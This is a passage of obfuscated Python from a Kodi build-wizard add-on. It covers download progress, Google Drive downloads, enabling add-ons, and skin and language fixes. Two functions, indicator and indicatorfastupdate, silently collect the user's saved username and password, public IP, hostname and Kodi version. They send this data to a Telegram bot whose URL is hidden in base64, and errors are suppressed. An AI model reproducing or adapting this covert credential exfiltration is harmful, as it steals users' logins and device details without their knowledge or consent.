        O000O00OOO0OO000O =O00000OOO0O0O000O /(1024 *1024 )#line:3477
        O0OO0OOO0OOOO0OO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO00O0OO000O0O0O ,'teal',O000O00OOO0OO000O )#line:3478
        if (time .time ()-OO000000O00OO00OO )>0 :#line:3479
          OO000O0O00O0000O0 =O00OO00OO000OO000 /(time .time ()-OO000000O00OO00OO )#line:3480
          OO000O0O00O0000O0 =OO000O0O00O0000O0 /1024 #line:3481
        else :#line:3482
         OO000O0O00O0000O0 =0 #line:3483
        O00000OOOO00OO0OO ='KB'#line:3484
        if OO000O0O00O0000O0 >=1024 :#line:3485
           OO000O0O00O0000O0 =OO000O0O00O0000O0 /1024 #line:3486
           O00000OOOO00OO0OO ='MB'#line:3487
        if OO000O0O00O0000O0 >0 and not O00OOO000OOO0O000 ==100 :#line:3488
            OO000OOO0000OOO00 =(O00000OOO0O0O000O -O00OO00OO000OO000 )/OO000O0O00O0000O0 #line:3489
        else :#line:3490
            OO000OOO0000OOO00 =0 #line:3491
        OO00OO0O00OOOO00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO000O0O00O0000O0 ,O00000OOOO00OO0OO )#line:3492
        O0000OOOOOO0000O0 .update (int (O00OOO000OOO0O000 ),"Downloading "+name ,O0OO0OOO0OOOO0OO0 ,OO00OO0O00OOOO00O )#line:3494
  OOO0O0OO0O0OOO0O0 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3497
  OOO0OO00OO000O00O .close ()#line:3499
  extract (O00OOOOO000OO0000 ,OOO0O0OO0O0OOO0O0 ,O0000OOOOOO0000O0 )#line:3501
  if os .path .exists (OOO0O0OO0O0OOO0O0 +'/scakemyer-script.quasar.burst'):#line:3502
    if os .path .exists (OOO0O0OO0O0OOO0O0 +'/script.quasar.burst'):#line:3503
     shutil .rmtree (OOO0O0OO0O0OOO0O0 +'/script.quasar.burst',ignore_errors =False )#line:3504
    os .rename (OOO0O0OO0O0OOO0O0 +'/scakemyer-script.quasar.burst',OOO0O0OO0O0OOO0O0 +'/script.quasar.burst')#line:3505
  if os .path .exists (OOO0O0OO0O0OOO0O0 +'/plugin.video.kmediatorrent-master'):#line:3507
    if os .path .exists (OOO0O0OO0O0OOO0O0 +'/plugin.video.kmediatorrent'):#line:3508
     shutil .rmtree (OOO0O0OO0O0OOO0O0 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3509
    os .rename (OOO0O0OO0O0OOO0O0 +'/plugin.video.kmediatorrent-master',OOO0O0OO0O0OOO0O0 +'/plugin.video.kmediatorrent')#line:3510
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3511
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3512
  try :#line:3513
    os .remove (O00OOOOO000OO0000 )#line:3514
  except :#line:3515
    pass #line:3516
  O0000OOOOOO0000O0 .close ()#line:3517
def dis_or_enable_addon (O0OOO0O0O00OOO0O0 ,O0OO0O0OO0OO00000 ,enable ="true"):#line:3518
    import json #line:3519
    O00OOO00O000OOOO0 ='"%s"'%O0OOO0O0O00OOO0O0 #line:3520
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OOO0O0O00OOO0O0 )and enable =="true":#line:3521
        logging .warning ('already Enabled')#line:3522
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0OOO0O0O00OOO0O0 )#line:3523
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OOO0O0O00OOO0O0 )and enable =="false":#line:3524
        return xbmc .log ("### Skipped %s, reason = not installed"%O0OOO0O0O00OOO0O0 )#line:3525
    else :#line:3526
        O0OOOOO0O00OO0OOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00OOO00O000OOOO0 ,enable )#line:3527
        OOOOO00000OOOO0O0 =xbmc .executeJSONRPC (O0OOOOO0O00OO0OOO )#line:3528
        O000O00O0OO00O0OO =json .loads (OOOOO00000OOOO0O0 )#line:3529
        if enable =="true":#line:3530
            xbmc .log ("### Enabled %s, response = %s"%(O0OOO0O0O00OOO0O0 ,O000O00O0OO00O0OO ))#line:3531
        else :#line:3532
            xbmc .log ("### Disabled %s, response = %s"%(O0OOO0O0O00OOO0O0 ,O000O00O0OO00O0OO ))#line:3533
    if O0OO0O0OO0OO00000 =='auto':#line:3534
     return True #line:3535
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3536
def chunk_report (OOOOOOO00OO000000 ,O000O0O00O0O0000O ,OOO00OOOO00OOO00O ):#line:3537
   OOOOO0O0O0O00O00O =float (OOOOOOO00OO000000 )/OOO00OOOO00OOO00O #line:3538
   OOOOO0O0O0O00O00O =round (OOOOO0O0O0O00O00O *100 ,2 )#line:3539
   if OOOOOOO00OO000000 >=OOO00OOOO00OOO00O :#line:3541
      sys .stdout .write ('\n')#line:3542
def chunk_read (OOO0OOO0O00OO0O00 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3544
   import time #line:3545
   O0OO00000O0OOOO00 =int (filesize )*1000000 #line:3546
   O000OO0O00O0OO0OO =0 #line:3548
   O0O0000O00O000OOO =time .time ()#line:3549
   O0O0000O0O0OOOO0O =0 #line:3550
   logging .warning ('Downloading')#line:3552
   with open (destination ,"wb")as O0OOOO0O0OOO0O0O0 :#line:3553
    while 1 :#line:3554
      OO0OOOOOO0O0O00OO =time .time ()-O0O0000O00O000OOO #line:3555
      O0O0OO00OO0OO0O0O =int (O0O0000O0O0OOOO0O *chunk_size )#line:3556
      O0O00OO00OOO00O00 =OOO0OOO0O00OO0O00 .read (chunk_size )#line:3557
      O0OOOO0O0OOO0O0O0 .write (O0O00OO00OOO00O00 )#line:3558
      O0OOOO0O0OOO0O0O0 .flush ()#line:3559
      O000OO0O00O0OO0OO +=len (O0O00OO00OOO00O00 )#line:3560
      O00000OOO0000OOOO =float (O000OO0O00O0OO0OO )/O0OO00000O0OOOO00 #line:3561
      O00000OOO0000OOOO =round (O00000OOO0000OOOO *100 ,2 )#line:3562
      if int (OO0OOOOOO0O0O00OO )>0 :#line:3563
        OO0OOOO000OO0O00O =int (O0O0OO00OO0OO0O0O /(1024 *OO0OOOOOO0O0O00OO ))#line:3564
      else :#line:3565
         OO0OOOO000OO0O00O =0 #line:3566
      if OO0OOOO000OO0O00O >1024 and not O00000OOO0000OOOO ==100 :#line:3567
          O0OOOOO0OOO0O0O0O =int (((O0OO00000O0OOOO00 -O0O0OO00OO0OO0O0O )/1024 )/(OO0OOOO000OO0O00O ))#line:3568
      else :#line:3569
          O0OOOOO0OOO0O0O0O =0 #line:3570
      if O0OOOOO0OOO0O0O0O <0 :#line:3571
        O0OOOOO0OOO0O0O0O =0 #line:3572
      dp .update (int (O00000OOO0000OOOO ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O00000OOO0000OOOO ,O0O0OO00OO0OO0O0O /(1024 *1024 ),O0OO00000O0OOOO00 /(1000 *1000 ),OO0OOOO000OO0O00O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0OOOOO0OOO0O0O0O ,60 ))#line:3573
      if dp .iscanceled ():#line:3574
         dp .close ()#line:3575
         break #line:3576
      if not O0O00OO00OOO00O00 :#line:3577
         break #line:3578
      if report_hook :#line:3580
         report_hook (O000OO0O00O0OO0OO ,chunk_size ,O0OO00000O0OOOO00 )#line:3581
      O0O0000O0O0OOOO0O +=1 #line:3582
   logging .warning ('END Downloading')#line:3583
   return O000OO0O00O0OO0OO #line:3584
def googledrive_download (O0OO00O0000O0OO00 ,OO0O0OOOO0OOOOOOO ,OO00O0O0OO000O0O0 ,O0000OO0O0O0O00O0 ):#line:3586
    OO00O000O000O00OO =[]#line:3590
    O0000O00OOO00000O =O0OO00O0000O0OO00 .split ('=')#line:3591
    O0OO00O0000O0OO00 =O0000O00OOO00000O [len (O0000O00OOO00000O )-1 ]#line:3592
    def O00OOO0OOOO000OOO (O0OO0O0OO0OOOOOO0 ):#line:3594
        for O00OOOOOOO0000OO0 in O0OO0O0OO0OOOOOO0 :#line:3596
            logging .warning ('cookie.name')#line:3597
            logging .warning (O00OOOOOOO0000OO0 .name )#line:3598
            OOO0OO0O0OO00O0O0 =O00OOOOOOO0000OO0 .value #line:3599
            if 'download_warning'in O00OOOOOOO0000OO0 .name :#line:3600
                logging .warning (O00OOOOOOO0000OO0 .value )#line:3601
                logging .warning ('cookie.value')#line:3602
                return O00OOOOOOO0000OO0 .value #line:3603
            return OOO0OO0O0OO00O0O0 #line:3604
        return None #line:3606
    def OOOO0O000OOOOOO0O (O0O0O0O00000O0OOO ,OO000OOO000OOOO0O ):#line:3608
        O00O000OO0O00O0OO =32768 #line:3610
        OOOOOO0OOOO0O000O =time .time ()#line:3611
        with open (OO000OOO000OOOO0O ,"wb")as O0O00OO0O0O00OO0O :#line:3613
            O00O0O0O00OO0000O =1 #line:3614
            OO00OOO00O0OO0OOO =32768 #line:3615
            try :#line:3616
                O00O00OO0OOOOOO00 =int (O0O0O0O00000O0OOO .headers .get ('content-length'))#line:3617
                print ('file total size :',O00O00OO0OOOOOO00 )#line:3618
            except TypeError :#line:3619
                print ('using dummy length !!!')#line:3620
                O00O00OO0OOOOOO00 =int (O0000OO0O0O0O00O0 )*1000000 #line:3621
            for OO0O0OO0OO0OO0000 in O0O0O0O00000O0OOO .iter_content (O00O000OO0O00O0OO ):#line:3622
                if OO0O0OO0OO0OO0000 :#line:3623
                    O0O00OO0O0O00OO0O .write (OO0O0OO0OO0OO0000 )#line:3624
                    O0O00OO0O0O00OO0O .flush ()#line:3625
                    OO0OOOOO0O000O0O0 =time .time ()-OOOOOO0OOOO0O000O #line:3626
                    O00OOOO0OOO00OOO0 =int (O00O0O0O00OO0000O *OO00OOO00O0OO0OOO )#line:3627
                    if OO0OOOOO0O000O0O0 ==0 :#line:3628
                        OO0OOOOO0O000O0O0 =0.1 #line:3629
                    OO0O0O00OO0O00O0O =int (O00OOOO0OOO00OOO0 /(1024 *OO0OOOOO0O000O0O0 ))#line:3630
                    O0OOO0OO0O000OO00 =int (O00O0O0O00OO0000O *OO00OOO00O0OO0OOO *100 /O00O00OO0OOOOOO00 )#line:3631
                    if OO0O0O00OO0O00O0O >1024 and not O0OOO0OO0O000OO00 ==100 :#line:3632
                      OO0OO0O000O00O0O0 =int (((O00O00OO0OOOOOO00 -O00OOOO0OOO00OOO0 )/1024 )/(OO0O0O00OO0O00O0O ))#line:3633
                    else :#line:3634
                      OO0OO0O000O00O0O0 =0 #line:3635
                    OO00O0O0OO000O0O0 .update (int (O0OOO0OO0O000OO00 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0OOO0OO0O000OO00 ,O00OOOO0OOO00OOO0 /(1024 *1024 ),O00O00OO0OOOOOO00 /(1000 *1000 ),OO0O0O00OO0O00O0O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO0OO0O000O00O0O0 ,60 ))#line:3637
                    O00O0O0O00OO0000O +=1 #line:3638
                    if OO00O0O0OO000O0O0 .iscanceled ():#line:3639
                     OO00O0O0OO000O0O0 .close ()#line:3640
                     break #line:3641
    O0OO000O000OOO0O0 ="https://docs.google.com/uc?export=download"#line:3642
    import urllib2 #line:3647
    import cookielib #line:3648
    from cookielib import CookieJar #line:3650
    OO0OO00OO00O00OO0 =CookieJar ()#line:3652
    O00OO0000OOO00000 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (OO0OO00OO00O00OO0 ))#line:3653
    O0OO00000O0000O0O ={'id':O0OO00O0000O0OO00 }#line:3655
    OOOOO00O0O0OO000O =urllib .urlencode (O0OO00000O0000O0O )#line:3656
    logging .warning (O0OO000O000OOO0O0 +'&'+OOOOO00O0O0OO000O )#line:3657
    O000000OO00OOOOO0 =O00OO0000OOO00000 .open (O0OO000O000OOO0O0 +'&'+OOOOO00O0O0OO000O )#line:3658
    O00OO000OOOOO0OOO =O000000OO00OOOOO0 .read ()#line:3659
    for O0O0O000000O000O0 in OO0OO00OO00O00OO0 :#line:3661
         logging .warning (O0O0O000000O000O0 )#line:3662
    O00OO00OO0O00O00O =O00OOO0OOOO000OOO (OO0OO00OO00O00OO0 )#line:3663
    logging .warning (O00OO00OO0O00O00O )#line:3664
    if O00OO00OO0O00O00O :#line:3665
        O0O0OOOO0OO000O0O ={'id':O0OO00O0000O0OO00 ,'confirm':O00OO00OO0O00O00O }#line:3666
        OO000OOOO0OOOO00O ={'Access-Control-Allow-Headers':'Content-Length'}#line:3667
        OOOOO00O0O0OO000O =urllib .urlencode (O0O0OOOO0OO000O0O )#line:3668
        O000000OO00OOOOO0 =O00OO0000OOO00000 .open (O0OO000O000OOO0O0 +'&'+OOOOO00O0O0OO000O )#line:3669
        chunk_read (O000000OO00OOOOO0 ,report_hook =chunk_report ,dp =OO00O0O0OO000O0O0 ,destination =OO0O0OOOO0OOOOOOO ,filesize =O0000OO0O0O0O00O0 )#line:3670
    return (OO00O000O000O00OO )#line:3674
def kodi17Fix ():#line:3675
	OOOO000OOOO0OO0OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3676
	O00O00OOO0O000000 =[]#line:3677
	for OOOOOO00O0OO0000O in sorted (OOOO000OOOO0OO0OO ,key =lambda OO0O00O00O0O0OOO0 :OO0O00O00O0O0OOO0 ):#line:3678
		OO0OOOOOO0OO0000O =os .path .join (OOOOOO00O0OO0000O ,'addon.xml')#line:3679
		if os .path .exists (OO0OOOOOO0OO0000O ):#line:3680
			OO00O0O0O00O0000O =OOOOOO00O0OO0000O .replace (ADDONS ,'')[1 :-1 ]#line:3681
			OOO0O000O00OO00O0 =open (OO0OOOOOO0OO0000O )#line:3682
			O00O0O0000OOOO00O =OOO0O000O00OO00O0 .read ()#line:3683
			O0000OOOOO00OO00O =parseDOM (O00O0O0000OOOO00O ,'addon',ret ='id')#line:3684
			OOO0O000O00OO00O0 .close ()#line:3685
			try :#line:3686
				OOO000OO0O0OOOOOO =xbmcaddon .Addon (id =O0000OOOOO00OO00O [0 ])#line:3687
			except :#line:3688
				try :#line:3689
					log ("%s was disabled"%O0000OOOOO00OO00O [0 ],xbmc .LOGDEBUG )#line:3690
					O00O00OOO0O000000 .append (O0000OOOOO00OO00O [0 ])#line:3691
				except :#line:3692
					try :#line:3693
						log ("%s was disabled"%OO00O0O0O00O0000O ,xbmc .LOGDEBUG )#line:3694
						O00O00OOO0O000000 .append (OO00O0O0O00O0000O )#line:3695
					except :#line:3696
						if len (O0000OOOOO00OO00O )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OO00O0O0O00O0000O ,xbmc .LOGERROR )#line:3697
						else :log ("Unabled to enable: %s"%OOOOOO00O0OO0000O ,xbmc .LOGERROR )#line:3698
	if len (O00O00OOO0O000000 )>0 :#line:3699
		OOO00000OO0OO00OO =0 #line:3700
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3701
		for OOOOOOO00O0OOOOO0 in O00O00OOO0O000000 :#line:3702
			OOO00000OO0OO00OO +=1 #line:3703
			OO0OO0O0OO0OOO00O =int (percentage (OOO00000OO0OO00OO ,len (O00O00OOO0O000000 )))#line:3704
			DP .update (OO0OO0O0OO0OOO00O ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOOO00O0OOOOO0 ))#line:3705
			addonDatabase (OOOOOOO00O0OOOOO0 ,1 )#line:3706
			if DP .iscanceled ():break #line:3707
		if DP .iscanceled ():#line:3708
			DP .close ()#line:3709
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3710
			sys .exit ()#line:3711
		DP .close ()#line:3712
	forceUpdate ()#line:3713
def indicator ():#line:3715
       try :#line:3716
          import json #line:3717
          wiz .log ('FRESH MESSAGE')#line:3718
          OOO0OO0OOOO000O0O =(ADDON .getSetting ("user"))#line:3719
          O000OOO00000O0OOO =(ADDON .getSetting ("pass"))#line:3720
          OO00O0000OO0O0O0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3721
          OO000O00O0O0OOOOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3722
          O00OO00O0O0OO0OOO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3723
          O0O0000OOOOO00OO0 =str (json .loads (O00OO00O0O0OO0OOO )['ip'])#line:3724
          O00000O0OO00O00OO =OOO0OO0OOOO000O0O #line:3725
          OO0OO0OO00OO00O0O =O000OOO00000O0OOO #line:3726
          import socket #line:3727
          O00OO00O0O0OO0OOO =urllib2 .urlopen (OO000O00O0O0OOOOO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O00000O0OO00O00OO +' - '+OO0OO0OO00OO00O0O +' - '+OO00O0000OO0O0O0O +' - '+O0O0000OOOOO00OO0 ).readlines ()#line:3728
       except :pass #line:3730
def indicatorfastupdate ():#line:3732
       try :#line:3733
          import json #line:3734
          wiz .log ('FRESH MESSAGE')#line:3735
          OOO000000OOO000OO =(ADDON .getSetting ("user"))#line:3736
          O0OOO0000OO00O0O0 =(ADDON .getSetting ("pass"))#line:3737
          O000OO0O000O00OO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3738
          OO0OOOOOOO00OO0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3740
          O0000O000000O0O0O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3741
          O000OO00O000OO0OO =str (json .loads (O0000O000000O0O0O )['ip'])#line:3742
          O00OO0OO000OOOO00 =OOO000000OOO000OO #line:3743
          OO0OOO00O0OOO000O =O0OOO0000OO00O0O0 #line:3744
          import socket #line:3746
          O0000O000000O0O0O =urllib2 .urlopen (OO0OOOOOOO00OO0OO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O00OO0OO000OOOO00 +' - '+OO0OOO00O0OOO000O +' - '+O000OO0O000O00OO0 +' - '+O000OO00O000OO0OO ).readlines ()#line:3747
       except :pass #line:3749
def skinfix18 ():#line:3751
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3752
		O0O0OOO00O0OOO0OO =wiz .workingURL (SKINID18DDONXML )#line:3753
		if O0O0OOO00O0OOO0OO ==True :#line:3754
			OOO00O0O000OO0000 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3755
			if len (OOO00O0O000OO0000 )>0 :#line:3756
				O000OO0OOOO0000OO ='%s-%s.zip'%(SKINID18 ,OOO00O0O000OO0000 [0 ])#line:3757
				OOO0O000OOOO00O0O =wiz .workingURL (SKIN18ZIPURL +O000OO0OOOO0000OO )#line:3758
				if OOO0O000OOOO00O0O ==True :#line:3759
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3760
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3761
					O000OOO0O000OOO00 =os .path .join (PACKAGES ,O000OO0OOOO0000OO )#line:3762
					try :os .remove (O000OOO0O000OOO00 )#line:3763
					except :pass #line:3764
					downloader .download (SKIN18ZIPURL +O000OO0OOOO0000OO ,O000OOO0O000OOO00 ,DP )#line:3765
					extract .all (O000OOO0O000OOO00 ,HOME ,DP )#line:3766
					try :#line:3767
						OOO0O0O00OO0OO0OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3768
						OO00O0000OO0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3769
						os .rename (OOO0O0O00OO0OO0OO ,OO00O0000OO0OO0O0 )#line:3770
					except :#line:3771
						pass #line:3772
					try :#line:3773
						OO0O0O000OOOO0OO0 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OOOO0OOOOO00OO0OO =OO0O0O000OOOO0OO0 .read ();OO0O0O000OOOO0OO0 .close ()#line:3774
						OO0000OO0O0000O0O =wiz .parseDOM (OOOO0OOOOO00OO0OO ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3775
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0000OO0O0000O0O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3776
					except :#line:3777
						pass #line:3778
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3779
					DP .close ()#line:3780
					xbmc .sleep (500 )#line:3781
					wiz .forceUpdate (True )#line:3782
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3783
				else :#line:3784
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3785
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOO0O000OOOO00O0O ,xbmc .LOGERROR )#line:3786
			else :#line:3787
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3788
		else :#line:3789
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3790
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3791
def skinfix17 ():#line:3792
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3793
		OO00O0O00O0O0OO00 =wiz .workingURL (SKINID17DDONXML )#line:3794
		if OO00O0O00O0O0OO00 ==True :#line:3795
			OOOOO00O0O0O0000O =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3796
			if len (OOOOO00O0O0O0000O )>0 :#line:3797
				O000O0OOO00OOO00O ='%s-%s.zip'%(SKINID17 ,OOOOO00O0O0O0000O [0 ])#line:3798
				O0O00OOO000000OO0 =wiz .workingURL (SKIN17ZIPURL +O000O0OOO00OOO00O )#line:3799
				if O0O00OOO000000OO0 ==True :#line:3800
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3801
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3802
					OO0OO0OOOOOO0000O =os .path .join (PACKAGES ,O000O0OOO00OOO00O )#line:3803
					try :os .remove (OO0OO0OOOOOO0000O )#line:3804
					except :pass #line:3805
					downloader .download (SKIN17ZIPURL +O000O0OOO00OOO00O ,OO0OO0OOOOOO0000O ,DP )#line:3806
					extract .all (OO0OO0OOOOOO0000O ,HOME ,DP )#line:3807
					try :#line:3808
						OOO0O0O000OO00O00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3809
						OOOO0000OO000OOOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3810
						os .rename (OOO0O0O000OO00O00 ,OOOO0000OO000OOOO )#line:3811
					except :#line:3812
						pass #line:3813
					try :#line:3814
						O0O0000000OO0OO0O =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O00O0O0OO0OOO0O0O =O0O0000000OO0OO0O .read ();O0O0000000OO0OO0O .close ()#line:3815
						OO00OO00OO0O0O000 =wiz .parseDOM (O00O0O0OO0OOO0O0O ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3816
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00OO00OO0O0O000 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3817
					except :#line:3818
						pass #line:3819
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3820
					DP .close ()#line:3821
					xbmc .sleep (500 )#line:3822
					wiz .forceUpdate (True )#line:3823
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3824
				else :#line:3825
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3826
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0O00OOO000000OO0 ,xbmc .LOGERROR )#line:3827
			else :#line:3828
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3829
		else :#line:3830
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3831
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3832
def fix17update ():#line:3833
	if KODIV >=17 and KODIV <18 :#line:3834
		wiz .kodi17Fix ()#line:3835
		xbmc .sleep (4000 )#line:3836
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3837
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3838
		fixfont ()#line:3839
		OOO0O0OOOOO0O00OO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3840
		try :#line:3842
			O00O0000OO0OOOO00 =open (OOO0O0OOOOO0O00OO ,'r')#line:3843
			OOOOOO00O00000O0O =O00O0000OO0OOOO00 .read ()#line:3844
			O00O0000OO0OOOO00 .close ()#line:3845
			OOO0OO0O000OOOO00 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3846
			O00O0OO0OO0OO0000 =re .compile (OOO0OO0O000OOOO00 ).findall (OOOOOO00O00000O0O )[0 ]#line:3847
			O00O0000OO0OOOO00 =open (OOO0O0OOOOO0O00OO ,'w')#line:3848
			O00O0000OO0OOOO00 .write (OOOOOO00O00000O0O .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O00O0OO0OO0OO0000 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3849
			O00O0000OO0OOOO00 .close ()#line:3850
		except :#line:3851
				pass #line:3852
		wiz .kodi17Fix ()#line:3853
		OOO0O0OOOOO0O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3854
		try :#line:3855
			O00O0000OO0OOOO00 =open (OOO0O0OOOOO0O00OO ,'r')#line:3856
			OOOOOO00O00000O0O =O00O0000OO0OOOO00 .read ()#line:3857
			O00O0000OO0OOOO00 .close ()#line:3858
			OOO0OO0O000OOOO00 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3859
			O00O0OO0OO0OO0000 =re .compile (OOO0OO0O000OOOO00 ).findall (OOOOOO00O00000O0O )[0 ]#line:3860
			O00O0000OO0OOOO00 =open (OOO0O0OOOOO0O00OO ,'w')#line:3861
			O00O0000OO0OOOO00 .write (OOOOOO00O00000O0O .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O00O0OO0OO0OO0000 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3862
			O00O0000OO0OOOO00 .close ()#line:3863
		except :#line:3864
				pass #line:3865
		swapSkins ('skin.Premium.mod')#line:3866
def fix18update ():#line:3868
	if KODIV >=18 :#line:3869
		xbmc .sleep (4000 )#line:3870
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3871
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3872
		fixfont ()#line:3873
		O0OOO0O0OOOOOOO0O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3874
		try :#line:3875
			O0O00O0OO0OOOO00O =open (O0OOO0O0OOOOOOO0O ,'r')#line:3876
			O00O00OOO00OO0000 =O0O00O0OO0OOOO00O .read ()#line:3877
			O0O00O0OO0OOOO00O .close ()#line:3878
			OOOO0OO000O000OOO ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3879
			O0OO0O0OO00OOO00O =re .compile (OOOO0OO000O000OOO ).findall (O00O00OOO00OO0000 )[0 ]#line:3880
			O0O00O0OO0OOOO00O =open (O0OOO0O0OOOOOOO0O ,'w')#line:3881
